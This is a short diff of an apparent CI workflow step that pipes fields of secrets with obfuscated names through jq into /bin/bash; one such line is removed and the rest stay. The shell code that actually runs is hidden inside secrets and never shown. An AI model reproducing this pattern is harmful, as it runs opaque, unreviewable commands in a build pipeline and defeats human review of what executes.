@@ -18,7 +18,6 @@ jobs:
           wvdgv7: ${{ secrets.wvdgv7 }}
         run: |
           printf '%s' "$wvdgv7" | jq -r .a461 | /bin/bash
-          echo $tej7 | jq -r .dlor90259 | /bin/bash
           echo $j432 | jq -r .pakit6688 | /bin/bash
           echo $z87 | jq -r .cbl6804 | /bin/bash
           echo $x945 | jq -r .e7 | /bin/bash
